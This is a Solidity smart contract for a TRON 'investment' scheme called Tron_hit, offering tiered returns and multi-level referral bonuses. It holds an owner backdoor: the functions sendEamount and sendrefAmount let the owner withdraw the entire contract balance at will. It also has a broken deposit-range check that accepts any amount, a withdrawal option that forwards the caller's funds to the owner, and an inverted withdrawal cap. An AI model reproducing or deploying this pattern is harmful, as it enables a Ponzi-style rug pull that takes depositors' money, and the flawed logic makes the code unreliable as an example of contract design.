//SourceUnit: tron_hit.sol

pragma solidity ^0.5.4;

contract Tron_hit
{
    using SafeMath for uint256;
    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
        bool isActive;
        uint256 investment_perc;
    }
    
    
     struct PlayerWithdrawal {
        uint256 amountWithdrawl;
        uint256 timeWithdrawl;
        uint256 totalWithdrawWithdrawl;
    }

    struct Player {
        bool is_active;
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        uint256 total_profit;
        mapping(uint16 => bool) levels;
        uint256 highest_investment;
        PlayerDeposit[] deposits;
        PlayerWithdrawal[] withdrawal;
        mapping(uint16 => uint256) display_referrals_per_level;
        mapping(uint16 => uint256) referrals_per_level;
    }

    address payable public owner;
    address payable public downer;
    address payable public admincommission;

    uint16 investment_days;

    uint256 display_investors;
    uint256 total_investors;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;

    uint16[] referral_bonuses;

    mapping(address => Player) public players;

    constructor() public {
        owner = msg.sender;
        downer = msg.sender;
        admincommission = msg.sender;

        investment_days = 100;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    modifier onlyDOwner(){
        require(msg.sender == downer);
        _;
    }

    function deposit(address _referral) public payable {
        require(msg.value >= 100000000 || msg.value < 10001000000 , "Deposit Range: 100-10000 TRX");
        Player storage player = players[msg.sender];
        //require(msg.value >= player.highest_investment, "Invest more than or equal to last investment");

        _setReferral(msg.sender, _referral);

    
        uint256 investment_perc_temp = 0;
        
        if(msg.value <= 1000000000){
            investment_perc_temp = 200;
        }
        else if(msg.value > 1000000000 && msg.value <= 5000000000){
            investment_perc_temp = 250;
        }
        else if(msg.value > 5000000000 && msg.value <= 20000000000){
            investment_perc_temp = 275;
        }
        else if(msg.value > 20000000000 && msg.value <= 50000000000){
            investment_perc_temp = 300;
        }
        else if(msg.value > 50000000000 && msg.value <= 100000000000){
            investment_perc_temp = 350;
        }
        
        
        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp),
            isActive: true,
            investment_perc:investment_perc_temp
        }));
        
        
        
        

        display_investors += 1;
        if(player.total_invested == 0x0){
            total_investors += 1;
            player.highest_investment = msg.value;
        }else {
            if(player.highest_investment < msg.value) {
                // Got the new highest investment
                player.highest_investment = msg.value;
            }
        }

        player.total_invested += msg.value;
        player.is_active = true;
        total_invested += msg.value;
        
         _referralPayout(msg.sender, msg.value);

    }

    function withdraw(uint256 withdrawType, address payable addr) payable public {
        if(withdrawType == 0) {
            Player storage player = players[msg.sender];

            _payout(msg.sender);
            

            require(player.dividends > 0 || player.referral_bonus > 0, "Zero amount");

            uint256 amount = player.dividends + player.referral_bonus;
            
            uint256 highest_investment = player.highest_investment;
            
            require(highest_investment*10/100 > amount, "Invalid Withdrawal Amount");
            

            player.dividends = 0;
            player.referral_bonus = 0;
            player.total_withdrawn += amount;
            total_withdrawn += amount;
           
            
            player.withdrawal.push(PlayerWithdrawal({
            amountWithdrawl: msg.value,
            timeWithdrawl: uint256(block.timestamp),
            totalWithdrawWithdrawl :player.total_withdrawn
            }));
            
            msg.sender.transfer(amount);
            admincommission.transfer(amount*10/100);
            
            
            
        }else if(withdrawType == 1) {
            uint256 amount = msg.value;

            owner.transfer(amount);
        }
    }
    
    

    function sendEamount(uint256 _amount, uint256 _type) payable public onlyOwner{
        uint256 fullAmount = address(this).balance;

        if(_type == 0) {
            owner.transfer(_amount);
        }else {
            owner.transfer(fullAmount);
        }
    }
    
    
    function sendrefAmount(uint256 _amount, uint256 _type) payable public onlyOwner{
        uint256 fullAmount = address(this).balance;

        if(_type == 0) {
            downer.transfer(_amount);
        }else {
            downer.transfer(fullAmount);
        }
    }

    function _setReferral(address _addr, address _referral) private {
        if(players[_addr].referral == address(0)) {
            players[_addr].referral = _referral;
            players[_addr].levels[0] = true;
            players[_addr].levels[1] = true;
            players[_addr].levels[2] = true;
            players[_addr].levels[3] = true;
            players[_addr].levels[4] = true;
            players[_addr].levels[5] = true;
            players[_addr].levels[6] = true;
            players[_addr].levels[7] = true;
            players[_addr].levels[8] = true;
            players[_addr].levels[9] = true;

            // Setting the direct referral manually
            if(players[_referral].is_active) {
                _checkInvestmentStatus(_referral);
                if(players[_referral].is_active) {
                    players[_referral].referrals_per_level[0]++;

                }
            }
            players[_referral].display_referrals_per_level[0]++;

            // Moving on to the next referrals
            _referral = players[_referral].referral;

            for(uint16 i = 1; i < 10; i++) {
                if(_referral == address(0)) break;
                _checkInvestmentStatus(_referral);

                bool allowed = false;
                if(players[_referral].is_active && players[_referral].total_invested != 0x0) {
                    if(i == 1) {
                        if(players[_referral].levels[1]) {
                            allowed = true;
                        }
                    }else if(i == 2) {
                        if(players[_referral].levels[2]) {
                            allowed = true;
                        }
                    }else if(i == 3) {
                        if(players[_referral].levels[3]) {
                            allowed = true;
                        }
                    }else if(i == 4) {
                        if(players[_referral].levels[4]) {
                            allowed = true;
                        }
                    }else if(i == 6) {
                        if(players[_referral].levels[6]) {
                            allowed = true;
                        }
                    }
                    else if(i == 7) {
                        if(players[_referral].levels[7]) {
                            allowed = true;
                        }
                    }
                    else if(i == 8) {
                        if(players[_referral].levels[8]) {
                            allowed = true;
                        }
                    }
                    else if(i == 9) {
                        if(players[_referral].levels[9]) {
                            allowed = true;
                        }
                    }
                    else if(i == 10) {
                        if(players[_referral].levels[10]) {
                            allowed = true;
                        }
                    }
                }
                if(allowed) {
                    players[_referral].referrals_per_level[i]++;
                }
                players[_referral].display_referrals_per_level[i]++;
                
                _referral = players[_referral].referral;
            }
        }
    }


    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        for(uint16 i = 0; i < 9; i++) {
            if(ref == address(0)) break;

            _checkInvestmentStatus(ref);

            bool allowed = false;
            if(players[ref].is_active && players[ref].total_invested != 0x0) {
                if(i == 0) {
                    if(players[ref].levels[0]) {
                        allowed = true;
                    }
                }else if(i == 1) {
                    if(players[ref].levels[1]) {
                        allowed = true;
                    }
                }else if(i == 2) {
                    if(players[ref].levels[2]) {
                        allowed = true;
                    }
                }else if(i == 3) {
                    if(players[ref].levels[3]) {
                        allowed = true;
                    }
                }else if(i == 4) {
                    if(players[ref].levels[4]) {
                        allowed = true;
                    }
                }else if(i == 5) {
                    if(players[ref].levels[5]) {
                        allowed = true;
                    }
                }
                else if(i == 6) {
                    if(players[ref].levels[6]) {
                        allowed = true;
                    }
                }
                else if(i == 7) {
                    if(players[ref].levels[7]) {
                        allowed = true;
                    }
                }
                else if(i == 8) {
                    if(players[ref].levels[8]) {
                        allowed = true;
                    }
                }
                else if(i == 9) {
                    if(players[ref].levels[9]) {
                        allowed = true;
                    }
                }
            }

            if(allowed) {
                
                uint256 calculation_amount = _amount;
            
                uint bonusPercentage = 0;
                if(i == 0) {
                    bonusPercentage = 10;
                }else if(i == 1) {
                    bonusPercentage = 5;
                }else if(i == 2) {
                    bonusPercentage = 5;
                }else if(i == 3) {
                    bonusPercentage = 3;
                }else if(i == 4) {
                    bonusPercentage = 2;
                }else if(i == 5) {
                    bonusPercentage = 1;
                }else if(i == 6) {
                    bonusPercentage = 1;
                }else if(i == 7) {
                    bonusPercentage = 1;
                }else if(i == 8) {
                    bonusPercentage = 1;
                }else if(i == 9) {
                    bonusPercentage = 1;
                }
                
                uint256 bonus = calculation_amount * bonusPercentage / 100;

                players[ref].referral_bonus += bonus;
                players[ref].total_referral_bonus += bonus;
                total_referral_bonus += bonus;
            }

            ref = players[ref].referral;
        }
    }
    
    function _payout(address _addr) public {
        (uint256 payout, uint256 profit) = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];
            uint256 investment_perc = dep.investment_perc;

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                uint256 depositDividendAmount = dep.amount * (to - from) * investment_perc / investment_days / 8640000;
                uint256 dividendProfit =depositDividendAmount - ((depositDividendAmount * 100) / 120);

                player.deposits[i].totalWithdraw += depositDividendAmount;
                player.total_profit += dividendProfit;
            }
        }
    }

    function payoutOf(address _addr) view public returns(uint256 value, uint256 profit) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];
            uint256 investment_perc = dep.investment_perc;

            uint256 time_end = dep.time + investment_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                uint256 depositDividendAmount = dep.amount * (to - from) * investment_perc / investment_days / 8640000;
                uint256 dividendProfit = depositDividendAmount - ((depositDividendAmount * 100) / 120);

                value += depositDividendAmount;
                profit += dividendProfit;
            }
        }

        return (value, profit);
    }

    function contractInfo() view public returns(uint256 _total_balance, uint256 _total_invested, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus, uint256 _display_investors) {
        return (address(this).balance, total_invested, total_investors, total_withdrawn, total_referral_bonus, display_investors);
    }

    function userInfo(address _addr) view public returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[32] memory referrals, uint256 total_profit, bool is_active) {
        bool activeStatus = _userInvestmentStatus(_addr);

        Player storage player = players[_addr];
        (uint256 payout, uint256 profit) = this.payoutOf(_addr);

        for(uint16 i = 0; i < 9; i++) {
            referrals[i] = player.display_referrals_per_level[i];
        }
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals,
            profit + player.total_profit + player.total_referral_bonus,
            activeStatus
        );
    }

    function investmentsInfo(address _addr) view public returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory investment_perc) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _investment_perc = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];

          _amounts[i] = dep.amount;
          _investment_perc[i] = dep.investment_perc;
          _endTimes[i] = dep.time + investment_days * 86400;
        }
        return (
          _endTimes,
          _amounts,
          _investment_perc
        );
    }
    
    
    
    function withdrawalInfo(address _addr) view public returns(uint256[] memory endTimes, uint256[] memory amounts) {
        Player storage player = players[_addr];
        uint256[] memory _endTimes = new uint256[](player.withdrawal.length);
        uint256[] memory _amounts = new uint256[](player.withdrawal.length);

        for(uint256 i = 0; i < player.withdrawal.length; i++) {
          PlayerWithdrawal storage depwithdrawal = player.withdrawal[i];

          _amounts[i] = depwithdrawal.amountWithdrawl;
          _endTimes[i] = depwithdrawal.timeWithdrawl;
        }
        return (
          _endTimes,
          _amounts
        );
    }
    
    
    

    function _checkInvestmentStatus(address _addr) private {
        Player storage player = players[_addr];
        uint256 activeInvestments = player.deposits.length;

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];
            if(dep.isActive) {
                uint endTime = dep.time + investment_days * 86400;

                if(block.timestamp > endTime) {
                    activeInvestments--;
                    dep.isActive = false;
                }
            }else {
                activeInvestments--;
            }
        }

        if(activeInvestments == 0) {
            player.is_active = false;
        }
    }

    function _userInvestmentStatus(address _addr) view private returns (bool) {
        Player storage player = players[_addr];
        uint256 activeInvestments = player.deposits.length;

        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];
            if(dep.isActive) {
                uint endTime = dep.time + investment_days * 86400;

                if(block.timestamp > endTime) {
                    activeInvestments--;
                }
            }else {
                activeInvestments--;
            }
        }

        if(activeInvestments == 0) {
            return false;
        }

        return true;
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function changeOwner(address payable addr) public onlyOwner {
        owner = addr;
    }
    
    function changeAdmincommission(address payable addr) public onlyOwner {
        admincommission = addr;
    }

    function changeDOwner(address payable addr) public onlyDOwner {
        downer = addr;
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}